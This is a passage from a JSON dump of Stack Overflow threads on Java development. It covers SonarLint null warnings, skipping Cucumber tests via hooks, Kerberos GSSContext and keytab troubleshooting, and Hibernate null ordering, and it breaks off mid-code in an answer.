&quot;getBody()&quot; can return null. sonarlint(java:S2259)\n</code></pre>\n<p>Also if I refactor and introduce a variable no warning appears:</p>\n<pre><code>ResponseVO body = response.getBody();\nif (body != null) {\n    String url = body.getUrl();\n</code></pre>\n<p>I don't need to add <code>response != null</code>, if added there's a different (ok) warning:</p>\n<pre><code>Remove this expression which always evaluates to &quot;true&quot; [+3 locations]sonarlint(java:S2589)\n</code></pre>\n<p>Is it SonarLint bug? why it warns about NullPointerException?</p>\n<p>I suspect it's related to HttpEntity <code>@Nullable</code> definition</p>\n<pre><code>@Nullable\npublic T getBody() {\n</code></pre>\n<p>I didn't find similar issue in <a href=\"https://jira.sonarsource.com/browse/SONARJAVA-1889?filter=-4&amp;jql=text%20%7E%20%22java%3AS2259%22%20order%20by%20created%20DESC\" rel=\"nofollow noreferrer\">jira.sonarsource</a></p>\n"},{"tags":["java","spring","rest","cucumber","cucumber-java"],"answers":[{"tags":[],"owner":{"account_id":10489136,"reputation":2762,"user_id":7731623,"display_name":"Nandan A"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1640267346,"creation_date":1640156233,"answer_id":70445288,"question_id":70443480,"body_markdown":"Updated the solution based on `M.P. Korstanje` comment.\r\nYou can skip tests by using `Assume`. The below is the one of the approach,\r\n\r\n**Code**:\r\n\r\n```\r\npublic class stepDef {\r\n\tstatic HashMap&lt;String, String&gt; conditions;\r\n\tstatic {\r\n\t\tconditions = new HashMap&lt;String, String&gt;();\r\n\t}\r\n\t\r\n\t@Before\r\n\tpublic void beforeTest(Scenario scenario) {\r\n\t\tif (conditions.containsKey(&quot;result&quot;) &amp;&amp; conditions.get(&quot;result&quot;).equalsIgnoreCase(&quot;false&quot;)) {\r\n\t\t\tSystem.out.println(&quot;************************Test not executed.************************&quot;);\r\n\t\t\tAssume.assumeTrue(false);\r\n\t\t} else {\r\n\t\t\tSystem.out.println(&quot;************************Started************************&quot;);\r\n\t\t}\r\n\t}\r\n\r\n\t@After\r\n\tpublic void afterTest(Scenario scenario) {\r\n\t\tif (scenario.isFailed()) {\r\n\t\t\tconditions.put(&quot;result&quot;, &quot;false&quot;);\r\n\t\t}\r\n\t\tSystem.out.println(&quot;************************Completed************************&quot;);\r\n\t}\r\n}\r\n```\r\n**Output**:\r\n\r\n```\r\n@Test\r\nScenario Outline: Test scenario                                                                                            \r\n************************Started************************\r\n//Result\r\n************************Completed************************\r\n\r\n@Test\r\nScenario Outline: decision                            \r\n************************Test not executed.************************\r\n    org.junit.AssumptionViolatedException: got: &lt;false&gt;, expected: is &lt;true&gt;\r\n\tat org.junit.Assume.assumeThat(Assume.java:106)\r\n\tat org.junit.Assume.assumeTrue(Assume.java:50)\r\n\tat cucumberStep.stepDef.beforeTest(stepDef.java:69)\r\n************************Completed************************\r\n```\r\n\r\n**Report**:\r\n\r\n\r\n[![enter image description here][1]][1]\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/eLmdn.png","title":"How to quit test execution using cucumber hooks","body":"<p>Updated the solution based on <code>M.P. Korstanje</code> comment.\nYou can skip tests by using <code>Assume</code>. The below is the one of the approach,</p>\n<p><strong>Code</strong>:</p>\n<pre><code>public class stepDef {\n    static HashMap&lt;String, String&gt; conditions;\n    static {\n        conditions = new HashMap&lt;String, String&gt;();\n    }\n    \n    @Before\n    public void beforeTest(Scenario scenario) {\n        if (conditions.containsKey(&quot;result&quot;) &amp;&amp; conditions.get(&quot;result&quot;).equalsIgnoreCase(&quot;false&quot;)) {\n            System.out.println(&quot;************************Test not executed.************************&quot;);\n            Assume.assumeTrue(false);\n        } else {\n            System.out.println(&quot;************************Started************************&quot;);\n        }\n    }\n\n    @After\n    public void afterTest(Scenario scenario) {\n        if (scenario.isFailed()) {\n            conditions.put(&quot;result&quot;, &quot;false&quot;);\n        }\n        System.out.println(&quot;************************Completed************************&quot;);\n    }\n}\n</code></pre>\n<p><strong>Output</strong>:</p>\n<pre><code>@Test\nScenario Outline: Test scenario                                                                                            \n************************Started************************\n//Result\n************************Completed************************\n\n@Test\nScenario Outline: decision                            \n************************Test not executed.************************\n    org.junit.AssumptionViolatedException: got: &lt;false&gt;, expected: is &lt;true&gt;\n    at org.junit.Assume.assumeThat(Assume.java:106)\n    at org.junit.Assume.assumeTrue(Assume.java:50)\n    at cucumberStep.stepDef.beforeTest(stepDef.java:69)\n************************Completed************************\n</code></pre>\n<p><strong>Report</strong>:</p>\n<p><a href=\"https://i.stack.imgur.com/eLmdn.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/eLmdn.png\" alt=\"enter image description here\" /></a></p>\n"}],"owner":{"account_id":9931091,"reputation":85,"user_id":7351030,"display_name":"syed naveed"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":848,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640267346,"creation_date":1640138720,"question_id":70443480,"body_markdown":"i have gone through various post but couldn&#39;t find a easy solution to quit cucumber test execution if one of the my API Test fails. I want to use `@After` hook to quit the test execution if one of the condition fails. For example if my `result()` return `false` i don&#39;t want to execute remaining test. Is there a easy way such as \r\n```\r\nif(result() == false){ \r\n   cucumber.quit();\r\n}\r\n```\r\n     \r\nI am using rest assured with gradle for my API Automation. ","title":"How to quit test execution using cucumber hooks","body":"<p>i have gone through various post but couldn't find a easy solution to quit cucumber test execution if one of the my API Test fails. I want to use <code>@After</code> hook to quit the test execution if one of the condition fails. For example if my <code>result()</code> return <code>false</code> i don't want to execute remaining test. Is there a easy way such as</p>\n<pre><code>if(result() == false){ \n   cucumber.quit();\n}\n</code></pre>\n<p>I am using rest assured with gradle for my API Automation.</p>\n"},{"tags":["java","kerberos","spring-security-kerberos","jgss"],"comments":[{"owner":{"account_id":7319797,"reputation":409,"user_id":5576171,"display_name":"Elena Oblomova"},"score":0,"creation_date":1450258264,"post_id":34306386,"comment_id":56358149,"body_markdown":"Please, show the code you use to establish the context","body":"Please, show the code you use to establish the context"},{"owner":{"account_id":6451300,"reputation":1733,"user_id":4998135,"accept_rate":95,"display_name":"Nico"},"score":1,"creation_date":1479459670,"post_id":34306386,"comment_id":68575979,"body_markdown":"I know this is an old thread but I recently had the exact same issue and in my case it was a problem with the spn.\n\nI called my service and then typed `klist` in cmd to search for my service. after I found it I saw something like this: HTTP/service.domain.com@DOMAIN.COM. What you have to do is verify that a SPN for this is created. Create an service account and create the spn with `setspn -a HTTP/service.domain.com domain\\serviceAccout` and after that create a keytab with `ktab -k FILE:your_filename.ktab -a HTTP/service.domain.com domain\\password_of_service_account`.","body":"I know this is an old thread but I recently had the exact same issue and in my case it was a problem with the spn.  I called my service and then typed <code>klist</code> in cmd to search for my service. after I found it I saw something like this: HTTP/service.domain.com@DOMAIN.COM. What you have to do is verify that a SPN for this is created. Create an service account and create the spn with <code>setspn -a HTTP&#47;service.domain.com domain\\serviceAccout</code> and after that create a keytab with <code>ktab -k FILE:your_filename.ktab -a HTTP&#47;service.domain.com domain\\password_of_service_account</code>."}],"answers":[{"tags":[],"owner":{"account_id":7319797,"reputation":409,"user_id":5576171,"display_name":"Elena Oblomova"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1450259491,"creation_date":1450259491,"answer_id":34308710,"question_id":34306386,"body_markdown":"It seems that the context is not fully established when you are trying to get SrcName. It seems to be the reason for ScrName to be null. According to https://www-01.ibm.com/support/knowledgecenter/SSYKE2_7.0.0/com.ibm.java.security.api.doc/jgss/org/ietf/jgss/GSSContext.html, acceptSecContext() generates a token and if it&#39;s not null, this token should be sent to the peer.\r\nAfter the call acceptSecContext() you should check if isEstablished() returns false. If it&#39;s so, \r\n\r\n&gt;  If this method returns false it indicates that a token is needed from its peer in order to continue the context establishment phase. A return value of true signals that the local end of the context is established. This may still require that a token be sent to the peer, if one is produced by GSS-API. During the context establishment phase, the isProtReady() method may be called to determine if the context can be used for the per-message operations. This allows applications to use per-message operations on contexts which aren&#39;t fully established.\r\n\r\nThe same is explained in more details in the tutorial http://www.cs.mun.ca/java-api-1.5/guide/security/jgss/tutorials/BasicClientServer.html:\r\n\r\n&gt; The acceptSecContext method may in turn return a token. If it does, the acceptor should send that token to the initiator, which should then call initSecContext again and pass it this token. Each time initSecContext or acceptSecContext returns a token, the application that called the method should send the token to its peer and that peer should pass the token to its appropriate method (acceptSecContext or initSecContext). This continues until the context is fully established (which is the case when the context&#39;s isEstablished method returns true).\r\n","title":"GSSContext with null SrcName","body":"<p>It seems that the context is not fully established when you are trying to get SrcName. It seems to be the reason for ScrName to be null. According to <a href=\"https://www-01.ibm.com/support/knowledgecenter/SSYKE2_7.0.0/com.ibm.java.security.api.doc/jgss/org/ietf/jgss/GSSContext.html\" rel=\"nofollow\">https://www-01.ibm.com/support/knowledgecenter/SSYKE2_7.0.0/com.ibm.java.security.api.doc/jgss/org/ietf/jgss/GSSContext.html</a>, acceptSecContext() generates a token and if it's not null, this token should be sent to the peer.\nAfter the call acceptSecContext() you should check if isEstablished() returns false. If it's so, </p>\n\n<blockquote>\n  <p>If this method returns false it indicates that a token is needed from its peer in order to continue the context establishment phase. A return value of true signals that the local end of the context is established. This may still require that a token be sent to the peer, if one is produced by GSS-API. During the context establishment phase, the isProtReady() method may be called to determine if the context can be used for the per-message operations. This allows applications to use per-message operations on contexts which aren't fully established.</p>\n</blockquote>\n\n<p>The same is explained in more details in the tutorial <a href=\"http://www.cs.mun.ca/java-api-1.5/guide/security/jgss/tutorials/BasicClientServer.html\" rel=\"nofollow\">http://www.cs.mun.ca/java-api-1.5/guide/security/jgss/tutorials/BasicClientServer.html</a>:</p>\n\n<blockquote>\n  <p>The acceptSecContext method may in turn return a token. If it does, the acceptor should send that token to the initiator, which should then call initSecContext again and pass it this token. Each time initSecContext or acceptSecContext returns a token, the application that called the method should send the token to its peer and that peer should pass the token to its appropriate method (acceptSecContext or initSecContext). This continues until the context is fully established (which is the case when the context's isEstablished method returns true).</p>\n</blockquote>\n"},{"tags":[],"owner":{"account_id":1048391,"reputation":3074,"user_id":1052899,"display_name":"Fabiano Tarlao"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1507383183,"creation_date":1502883177,"answer_id":45712445,"question_id":34306386,"body_markdown":"I faced the same `Checksum failed` error when implementing my GSSAPI socket demo that is a modification of the Oracle GSSAPI [tutorial][1] code.\r\nI executed my code on a Linux machine enrolled into a FreeIPA kerberos realm.\r\nI have used the vanilla `krb5.conf` file of my Linux system. No constraints on ticket `etype` are there:\r\n\r\n    ...\r\n    [libdefaults]\r\n      default_realm = AUTHDEMO.IT\r\n      dns_lookup_realm = true\r\n      dns_lookup_kdc = true\r\n      rdns = false\r\n      ticket_lifetime = 24h\r\n      forwardable = true\r\n      udp_preference_limit = 0 \r\n    ...\r\n\r\nThe FreeIPA realm default is to use type 18 tickets (AES-256).\r\n\r\nAbout my application, it has this policy file configured:\r\n\r\n    grant CodeBase &quot;file:./app.jar&quot; {\r\n            permission java.security.AllPermission;\r\n    };\r\n    \r\n    grant CodeBase &quot;file:./app.jar&quot; \r\n    \tPrincipal javax.security.auth.kerberos.KerberosPrincipal \r\n    \t\t&quot;servicename@AUTHDEMO.IT&quot; {\r\n    \r\n    \tpermission java.net.SocketPermission &quot;*&quot;, &quot;accept&quot;;\r\n    \r\n    \tpermission javax.security.auth.kerberos.ServicePermission\r\n    \t\t&quot;servicename@AUTHDEMO.IT&quot;, &quot;accept&quot;;\r\n    };\r\n\r\n    \r\nWhen executing the application I got this error on the acceptor side:\r\n\r\n&gt; GSSException: Failure unspecified at GSS-API level (Mechanism level:\r\n&gt; Encryption type AES256CTS mode with HMAC SHA1-96 is not\r\n&gt; supported/enabled)\r\n\r\nIn my case the error arises in the GSS acceptor side. In my application I generate the Jaas configuration programmatically (I&#39;ll refer at this as *DConfig*) and I don&#39;t use a config file.\r\nThe first solution, I found, is to use config files instead of DConfig and the problem disappeared, it worked fine.\r\nThe temporary solution, Jaas Config file:\r\n\r\n    DemoServer {\r\n      com.sun.security.auth.module.Krb5LoginModule required\r\n       principal=&quot;servicename@AUTHDEMO.IT&quot;\r\n       storeKey=true\r\n       debug=true; #not mandatory\r\n    };\r\n\r\n\r\nWith this configuration, no problem arises on the acceptor side and the application were able to check the service ticket validity and accept the connection.\r\n\r\nI asked myself.. **WHY?**\r\n\r\nI checked differences in the Subject(s) acquired with the two configurations. In the working case, with the config file, the subject contains, into the private credentials, both the password hashes credentials and the principal TGT ticket.\r\nWith DConfig, I obtain a Subject with only password hashes but there is no principal TGT ticket in private credentials.\r\n\r\n**My fix**\r\n\r\nDConfig contains the same settings of the configuration file and the other options are the replica of `Krb5LoginModule` defaults, at first I cannot see a reason for the misbehaviour.\r\n\r\nSetting `isInitiator = true`, into the acceptor side DConfig, solved the issue. `isInitiator = true has forced the persistence of TGT ticket into the subject.\r\n\r\nWith this workaround the  error has disappeared with no change into the system krb5.conf.\r\n\r\nMy cent is... after Jaas login, let&#39;s check your subject private credentials for lacking creds (You need the service principal TGT into your acceptor side subject!) and in case try to set `isInitiator = true` to the acceptor side too.\r\n\r\nRegards\r\n\r\n\r\n  [1]: http://docs.oracle.com/javase/7/docs/technotes/guides/security/jgss/tutorials/ClientServer.html","title":"GSSContext with null SrcName","body":"<p>I faced the same <code>Checksum failed</code> error when implementing my GSSAPI socket demo that is a modification of the Oracle GSSAPI <a href=\"http://docs.oracle.com/javase/7/docs/technotes/guides/security/jgss/tutorials/ClientServer.html\" rel=\"nofollow noreferrer\">tutorial</a> code.\nI executed my code on a Linux machine enrolled into a FreeIPA kerberos realm.\nI have used the vanilla <code>krb5.conf</code> file of my Linux system. No constraints on ticket <code>etype</code> are there:</p>\n\n<pre><code>...\n[libdefaults]\n  default_realm = AUTHDEMO.IT\n  dns_lookup_realm = true\n  dns_lookup_kdc = true\n  rdns = false\n  ticket_lifetime = 24h\n  forwardable = true\n  udp_preference_limit = 0 \n...\n</code></pre>\n\n<p>The FreeIPA realm default is to use type 18 tickets (AES-256).</p>\n\n<p>About my application, it has this policy file configured:</p>\n\n<pre><code>grant CodeBase \"file:./app.jar\" {\n        permission java.security.AllPermission;\n};\n\ngrant CodeBase \"file:./app.jar\" \n    Principal javax.security.auth.kerberos.KerberosPrincipal \n        \"servicename@AUTHDEMO.IT\" {\n\n    permission java.net.SocketPermission \"*\", \"accept\";\n\n    permission javax.security.auth.kerberos.ServicePermission\n        \"servicename@AUTHDEMO.IT\", \"accept\";\n};\n</code></pre>\n\n<p>When executing the application I got this error on the acceptor side:</p>\n\n<blockquote>\n  <p>GSSException: Failure unspecified at GSS-API level (Mechanism level:\n  Encryption type AES256CTS mode with HMAC SHA1-96 is not\n  supported/enabled)</p>\n</blockquote>\n\n<p>In my case the error arises in the GSS acceptor side. In my application I generate the Jaas configuration programmatically (I'll refer at this as <em>DConfig</em>) and I don't use a config file.\nThe first solution, I found, is to use config files instead of DConfig and the problem disappeared, it worked fine.\nThe temporary solution, Jaas Config file:</p>\n\n<pre><code>DemoServer {\n  com.sun.security.auth.module.Krb5LoginModule required\n   principal=\"servicename@AUTHDEMO.IT\"\n   storeKey=true\n   debug=true; #not mandatory\n};\n</code></pre>\n\n<p>With this configuration, no problem arises on the acceptor side and the application were able to check the service ticket validity and accept the connection.</p>\n\n<p>I asked myself.. <strong>WHY?</strong></p>\n\n<p>I checked differences in the Subject(s) acquired with the two configurations. In the working case, with the config file, the subject contains, into the private credentials, both the password hashes credentials and the principal TGT ticket.\nWith DConfig, I obtain a Subject with only password hashes but there is no principal TGT ticket in private credentials.</p>\n\n<p><strong>My fix</strong></p>\n\n<p>DConfig contains the same settings of the configuration file and the other options are the replica of <code>Krb5LoginModule</code> defaults, at first I cannot see a reason for the misbehaviour.</p>\n\n<p>Setting <code>isInitiator = true</code>, into the acceptor side DConfig, solved the issue. `isInitiator = true has forced the persistence of TGT ticket into the subject.</p>\n\n<p>With this workaround the  error has disappeared with no change into the system krb5.conf.</p>\n\n<p>My cent is... after Jaas login, let's check your subject private credentials for lacking creds (You need the service principal TGT into your acceptor side subject!) and in case try to set <code>isInitiator = true</code> to the acceptor side too.</p>\n\n<p>Regards</p>\n"}],"owner":{"account_id":1809759,"reputation":2549,"user_id":1646082,"accept_rate":80,"display_name":"Vartlok"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":6168,"favorite_count":0,"down_vote_count":0,"up_vote_count":6,"answer_count":2,"score":6,"last_activity_date":1640267251,"creation_date":1450251608,"question_id":34306386,"body_markdown":"I&#39;m working a web appliaction with SSO based on the Windows domain login, for this purpose I have chosen to validate Kerberos tickets. But now I&#39;m facing a problem for which I can&#39;t find a solution. I manage to validate a ticket without exceptions, but when I&#39;m trying to get the userName, `NullPointerException` is thrown, because the username is `null` and I don&#39;t know where is problem. \r\n\r\n**Why is user name null if I don&#39;t get any exception during the validation?**\r\n\r\nHow I get userName:\r\n`String clientName = gssContext.getSrcName().toString();`\r\n\r\nI create my client based on this:\r\n\r\nhttps://stackoverflow.com/questions/25289231/using-gssmanager-to-validate-a-kerberos-ticket\r\n\r\nhttps://stackoverflow.com/questions/370878/how-to-obtain-a-kerberos-service-ticket-via-gss-api\r\n\r\nhttp://docs.oracle.com/javase/7/docs/technotes/guides/security/jgss/single-signon.html\r\n\r\n**Update 1:**\r\n\r\nHow I setup content, just copy-paste form here https://stackoverflow.com/a/25450862/1646082:\r\n\r\n    final Oid spnegoOid = new Oid(&quot;1.3.6.1.5.5.2&quot;);\r\n\r\n    GSSManager gssmgr = GSSManager.getInstance();\r\n\r\n    // tell the GSSManager the Kerberos name of the service\r\n    GSSName serviceName = gssmgr.createName(this.servicePrincipal, GSSName.NT_USER_NAME);\r\n\r\n    // get the service&#39;s credentials. note that this run() method was called by Subject.doAs(),\r\n    // so the service&#39;s credentials (Service Principal Name and password) are already\r\n    // available in the Subject\r\n    GSSCredential serviceCredentials = gssmgr.createCredential(serviceName,\r\n            GSSCredential.INDEFINITE_LIFETIME, spnegoOid, GSSCredential.ACCEPT_ONLY);\r\n\r\n    // create a security context for decrypting the service ticket\r\n    GSSContext gssContext = gssmgr.createContext(serviceCredentials);\r\n\r\n    // decrypt the service ticket\r\n    System.out.println(&quot;Entering accpetSecContext...&quot;);\r\n    System.out.println( new String (Base64.encodeBase64( gssContext.acceptSecContext(this.kerberosTicket, 0,\r\n            this.kerberosTicket.length) ) ));\r\n\r\n    // get the client name from the decrypted service ticket\r\n    // note that Active Directory created the service ticket, so we can trust it\r\n    String clientName = gssContext.getSrcName().toString();\r\n\r\n\r\n**Update 2:**\r\n\r\nIf I setup spring security based on this https://spring.io/blog/2009/09/28/spring-security-kerberos-spnego-extension i also got the same error:\r\n\r\n&gt;  java.lang.NullPointerException \tat\r\n&gt; org.springframework.security.extensions.kerberos.SunJaasKerberosTicketValidator$KerberosValidateAction.run(SunJaasKerberosTicketValidator.java:136)\r\n&gt; \tat\r\n&gt; org.springframework.security.extensions.kerberos.SunJaasKerberosTicketValidator$KerberosValidateAction.run(SunJaasKerberosTicketValidator.java:125)\r\n&gt; \tat java.security.AccessController.doPrivileged(Native Method) \tat\r\n&gt; javax.security.auth.Subject.doAs(Subject.java:422)\r\n\r\n    private static class KerberosValidateAction implements PrivilegedExceptionAction&lt;String&gt; {\r\n        byte[] kerberosTicket;\r\n\r\n        public KerberosValidateAction(byte[] kerberosTicket) {\r\n            this.kerberosTicket = kerberosTicket;\r\n        }\r\n\r\n        @Override\r\n        public String run() throws Exception {\r\n            GSSContext context = GSSManager.getInstance().createContext((GSSCredential) null);\r\n            context.acceptSecContext(kerberosTicket, 0, kerberosTicket.length);\r\n            String user = context.getSrcName().toString(); // ERROR!\r\n            context.dispose();\r\n            return user;\r\n        }\r\n\r\n    }\r\n\r\n**Update 3:**\r\n\r\nAlso tried change Java version from 1.8 to 1.7 as suggested here https://stackoverflow.com/questions/29747565/domain-authentication-with-kerberos-fails. No result.\r\n\r\n**Update 4:**\r\n\r\nFirst of all. Don&#39;t user Java 1.8 b40 and b45, both of them are broken. And don&#39;t test it on local PC, it doesn&#39;t work(I don&#39;t know why).\r\n\r\nAfter changing on newest(b65) Java version, I got exception about encription(Cannot find key of appropriate type to decrypt AP REP - AES256 ...). This I have fixed by Java Cryptography Extension (JCE) for Java 1.8 and re-create keytab with `/crypto AES256-SHA1` after all this i got exception:\r\n\r\n&gt; GSSException: Failure unspecified at GSS-API level (Mechanism level:\r\n&gt; Checksum failed) at\r\n&gt; sun.security.jgss.krb5.Krb5Context.acceptSecContext(Unknown Source) at\r\n&gt; sun.security.jgss.GSSContextImpl.acceptSecContext(Unknown Source) at\r\n&gt; sun.security.jgss.GSSContextImpl.acceptSecContext(Unknown Source) at\r\n&gt; GssServer$GssServerAction.run(GssServer.java:159) \r\n&gt; ... 4 more \r\n&gt; Caused by: KrbException: Checksum failed at\r\n&gt; sun.security.krb5.internal.crypto.ArcFourHmacEType.decrypt(Unknown\r\n&gt; Source) at\r\n&gt; sun.security.krb5.internal.crypto.ArcFourHmacEType.decrypt(Unknown\r\n&gt; Source) at sun.security.krb5.EncryptedData.decrypt(Unknown Source) at\r\n&gt; sun.security.krb5.KrbApReq.authenticate(Unknown Source) at\r\n&gt; sun.security.krb5.KrbApReq.&lt;init&gt;(Unknown Source) at\r\n&gt; sun.security.jgss.krb5.InitSecContextToken.&lt;init&gt;(Unknown Source)\r\n&gt; ... 8 more \r\n&gt; Caused by: java.security.GeneralSecurityException: Checksum\r\n&gt; failed at\r\n&gt; sun.security.krb5.internal.crypto.dk.ArcFourCrypto.decrypt(Unknown\r\n&gt; Source) at\r\n&gt; sun.security.krb5.internal.crypto.ArcFourHmac.decrypt(Unknown Source)\r\n&gt; ... 14 more\r\n\r\nI tried [this tutorial][1] and other way to create keytabfile, but i still don&#39;t have solution.\r\n\r\n\r\n  [1]: https://dmdaa.wordpress.com/2010/03/13/kerberos-setup-and-jaas-configuration-for-running-sun-jgss-tutorial-against-ad/","title":"GSSContext with null SrcName","body":"<p>I'm working a web appliaction with SSO based on the Windows domain login, for this purpose I have chosen to validate Kerberos tickets. But now I'm facing a problem for which I can't find a solution. I manage to validate a ticket without exceptions, but when I'm trying to get the userName, <code>NullPointerException</code> is thrown, because the username is <code>null</code> and I don't know where is problem. </p>\n\n<p><strong>Why is user name null if I don't get any exception during the validation?</strong></p>\n\n<p>How I get userName:\n<code>String clientName = gssContext.getSrcName().toString();</code></p>\n\n<p>I create my client based on this:</p>\n\n<p><a href=\"https://stackoverflow.com/questions/25289231/using-gssmanager-to-validate-a-kerberos-ticket\">Using GSSManager to validate a Kerberos ticket</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/370878/how-to-obtain-a-kerberos-service-ticket-via-gss-api\">How to obtain a kerberos service ticket via GSS-API?</a></p>\n\n<p><a href=\"http://docs.oracle.com/javase/7/docs/technotes/guides/security/jgss/single-signon.html\" rel=\"nofollow noreferrer\">http://docs.oracle.com/javase/7/docs/technotes/guides/security/jgss/single-signon.html</a></p>\n\n<p><strong>Update 1:</strong></p>\n\n<p>How I setup content, just copy-paste form here <a href=\"https://stackoverflow.com/a/25450862/1646082\">https://stackoverflow.com/a/25450862/1646082</a>:</p>\n\n<pre><code>final Oid spnegoOid = new Oid(\"1.3.6.1.5.5.2\");\n\nGSSManager gssmgr = GSSManager.getInstance();\n\n// tell the GSSManager the Kerberos name of the service\nGSSName serviceName = gssmgr.createName(this.servicePrincipal, GSSName.NT_USER_NAME);\n\n// get the service's credentials. note that this run() method was called by Subject.doAs(),\n// so the service's credentials (Service Principal Name and password) are already\n// available in the Subject\nGSSCredential serviceCredentials = gssmgr.createCredential(serviceName,\n        GSSCredential.INDEFINITE_LIFETIME, spnegoOid, GSSCredential.ACCEPT_ONLY);\n\n// create a security context for decrypting the service ticket\nGSSContext gssContext = gssmgr.createContext(serviceCredentials);\n\n// decrypt the service ticket\nSystem.out.println(\"Entering accpetSecContext...\");\nSystem.out.println( new String (Base64.encodeBase64( gssContext.acceptSecContext(this.kerberosTicket, 0,\n        this.kerberosTicket.length) ) ));\n\n// get the client name from the decrypted service ticket\n// note that Active Directory created the service ticket, so we can trust it\nString clientName = gssContext.getSrcName().toString();\n</code></pre>\n\n<p><strong>Update 2:</strong></p>\n\n<p>If I setup spring security based on this <a href=\"https://spring.io/blog/2009/09/28/spring-security-kerberos-spnego-extension\" rel=\"nofollow noreferrer\">https://spring.io/blog/2009/09/28/spring-security-kerberos-spnego-extension</a> i also got the same error:</p>\n\n<blockquote>\n  <p>java.lang.NullPointerException   at\n  org.springframework.security.extensions.kerberos.SunJaasKerberosTicketValidator$KerberosValidateAction.run(SunJaasKerberosTicketValidator.java:136)\n    at\n  org.springframework.security.extensions.kerberos.SunJaasKerberosTicketValidator$KerberosValidateAction.run(SunJaasKerberosTicketValidator.java:125)\n    at java.security.AccessController.doPrivileged(Native Method)   at\n  javax.security.auth.Subject.doAs(Subject.java:422)</p>\n</blockquote>\n\n<pre><code>private static class KerberosValidateAction implements PrivilegedExceptionAction&lt;String&gt; {\n    byte[] kerberosTicket;\n\n    public KerberosValidateAction(byte[] kerberosTicket) {\n        this.kerberosTicket = kerberosTicket;\n    }\n\n    @Override\n    public String run() throws Exception {\n        GSSContext context = GSSManager.getInstance().createContext((GSSCredential) null);\n        context.acceptSecContext(kerberosTicket, 0, kerberosTicket.length);\n        String user = context.getSrcName().toString(); // ERROR!\n        context.dispose();\n        return user;\n    }\n\n}\n</code></pre>\n\n<p><strong>Update 3:</strong></p>\n\n<p>Also tried change Java version from 1.8 to 1.7 as suggested here <a href=\"https://stackoverflow.com/questions/29747565/domain-authentication-with-kerberos-fails\">Domain authentication with Kerberos fails</a>. No result.</p>\n\n<p><strong>Update 4:</strong></p>\n\n<p>First of all. Don't user Java 1.8 b40 and b45, both of them are broken. And don't test it on local PC, it doesn't work(I don't know why).</p>\n\n<p>After changing on newest(b65) Java version, I got exception about encription(Cannot find key of appropriate type to decrypt AP REP - AES256 ...). This I have fixed by Java Cryptography Extension (JCE) for Java 1.8 and re-create keytab with <code>/crypto AES256-SHA1</code> after all this i got exception:</p>\n\n<blockquote>\n  <p>GSSException: Failure unspecified at GSS-API level (Mechanism level:\n  Checksum failed) at\n  sun.security.jgss.krb5.Krb5Context.acceptSecContext(Unknown Source) at\n  sun.security.jgss.GSSContextImpl.acceptSecContext(Unknown Source) at\n  sun.security.jgss.GSSContextImpl.acceptSecContext(Unknown Source) at\n  GssServer$GssServerAction.run(GssServer.java:159) \n  ... 4 more \n  Caused by: KrbException: Checksum failed at\n  sun.security.krb5.internal.crypto.ArcFourHmacEType.decrypt(Unknown\n  Source) at\n  sun.security.krb5.internal.crypto.ArcFourHmacEType.decrypt(Unknown\n  Source) at sun.security.krb5.EncryptedData.decrypt(Unknown Source) at\n  sun.security.krb5.KrbApReq.authenticate(Unknown Source) at\n  sun.security.krb5.KrbApReq.(Unknown Source) at\n  sun.security.jgss.krb5.InitSecContextToken.(Unknown Source)\n  ... 8 more \n  Caused by: java.security.GeneralSecurityException: Checksum\n  failed at\n  sun.security.krb5.internal.crypto.dk.ArcFourCrypto.decrypt(Unknown\n  Source) at\n  sun.security.krb5.internal.crypto.ArcFourHmac.decrypt(Unknown Source)\n  ... 14 more</p>\n</blockquote>\n\n<p>I tried <a href=\"https://dmdaa.wordpress.com/2010/03/13/kerberos-setup-and-jaas-configuration-for-running-sun-jgss-tutorial-against-ad/\" rel=\"nofollow noreferrer\">this tutorial</a> and other way to create keytabfile, but i still don't have solution.</p>\n"},{"tags":["java","hibernate","null","sql-order-by"],"answers":[{"tags":[],"owner":{"account_id":100168,"reputation":2211,"user_id":270157,"display_name":"Goibniu"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1284109733,"creation_date":1284109733,"answer_id":3683409,"question_id":3683174,"body_markdown":"[There appears to be a change request/bug ticket open for this][1]\r\n\r\n\r\n  [1]: http://opensource.atlassian.com/projects/hibernate/browse/HHH-465","title":"Hibernate order by with nulls last","body":"<p><a href=\"http://opensource.atlassian.com/projects/hibernate/browse/HHH-465\" rel=\"nofollow noreferrer\">There appears to be a change request/bug ticket open for this</a></p>\n"},{"tags":[],"owner":{"account_id":26957,"reputation":564361,"user_id":70604,"display_name":"Pascal Thivent"},"down_vote_count":1,"up_vote_count":17,"is_accepted":true,"score":16,"last_activity_date":1415649842,"creation_date":1284113002,"answer_id":3683734,"question_id":3683174,"body_markdown":"Given that [HHH-465][1] is not fixed and is not going to get fixed in a near future for the reasons given by Steve Ebersole, your best option would be to use the `CustomNullsFirstInterceptor` attached to the issue either globally or specifically to alter the SQL statement. \r\n\r\nI&#39;m posting it below for the readers (credits to Emilio Dolce):\r\n\r\n    public class CustomNullsFirstInterceptor extends EmptyInterceptor {\r\n    \t\r\n    \tprivate static final long serialVersionUID = -3156853534261313031L;\r\n    \t\r\n    \tprivate static final String ORDER_BY_TOKEN = &quot;order by&quot;;\r\n    \r\n    \tpublic String onPrepareStatement(String sql) {\r\n    \t\t\r\n    \t\tint orderByStart = sql.toLowerCase().indexOf(ORDER_BY_TOKEN);\r\n    \t\tif (orderByStart == -1) {\r\n    \t\t\treturn super.onPrepareStatement(sql);\r\n    \t\t}\r\n    \t\torderByStart += ORDER_BY_TOKEN.length() + 1;\r\n    \t\tint orderByEnd = sql.indexOf(&quot;)&quot;, orderByStart);\r\n    \t\tif (orderByEnd == -1) {\r\n    \t\t\torderByEnd = sql.indexOf(&quot; UNION &quot;, orderByStart);\r\n    \t\t\tif (orderByEnd == -1) {\r\n    \t\t\t\torderByEnd = 